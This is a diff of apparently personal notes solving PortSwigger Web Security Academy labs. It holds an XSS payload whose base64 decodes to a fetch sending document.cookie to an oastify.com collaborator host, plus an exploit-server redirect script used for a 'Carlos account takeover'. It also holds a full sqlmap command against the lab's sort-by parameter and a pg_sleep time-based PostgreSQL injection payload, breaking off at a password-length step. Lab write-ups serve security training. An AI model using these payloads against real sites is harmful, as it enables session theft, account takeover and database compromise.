@@ -6,21 +6,24 @@ Exploit:
 "-eval(atob('ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ=='))-"
 
 base64 part:
-fetch('https://6ho7tvv3cg9zw205wwtrac5wrnxel49t.oastify.com?cookie='+document.cookie)
+fetch('https://your.burp.oastify.com?cookie='+document.cookie)
 
 Exploit server:
 <script>
-    document.location="https://0a440073036c814880321c91006200af.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==%27))-%22czichiz"
+    document.location="https://LAB-ID.h1-web-security-academy.net/?SearchTerm=%22-eval(atob(%27ZmV0Y2goJ2h0dHBzOi8vNmhvN3R2djNjZzl6dzIwNXd3dHJhYzV3cm54ZWw0OXQub2FzdGlmeS5jb20/Y29va2llPScrZG9jdW1lbnQuY29va2llKQ==%27))-%22czichiz"
 </script>
 
 Carlos account takeover!
 
-Active scan on new advanced search feature only accessible with user account => PostgreSQL injection dans param sort-by
+Active scan on new advanced search feature only accessible with user account => PostgreSQL injection on param sort-by
 
 PostgreSQL: PostgreSQL 12.14 (Ubuntu 12.14-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0, 64-bit 
 
+Automatic with sqlmap:
 
-Vérification:
+sqlmap.py -u "https://LAB-ID.h1-web-security-academy.net:443/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --cookie="_lab=48%7cMC4CFQCUigHc10K7RPnpgqQELxmnJC1XtAIVAIjxga6lfvULTXA5Pbqay2che1mf23VpCwRs7bp8k0P0WAnCIJh1MEhnSS%2b7xWrrVBgesSt08Mm7GHU6AMaFuhNMV79n6urUwKDt%2bvAmBTwIDGNzN3EcnM5lqarXKPo0JzTNR0i9BdZIvvAYXA%3d%3d; session=97xXNPN8LvO14nMh3tQLARSy47O67rgV" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36" --referer="https://0ad500100381b261800cf872003800f1.h1-web-security-academy.net/filtered_search?SearchTerm=test&sort-by=DATE&writer=" --delay=0 --timeout=30 --retries=0 -p "sort-by" --level=3 --risk=1 --threads=1 --time-sec=5 -b --batch --current-user
+
+Verification:
 sort-by=DATE;SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END--
 
 Find password lenght:
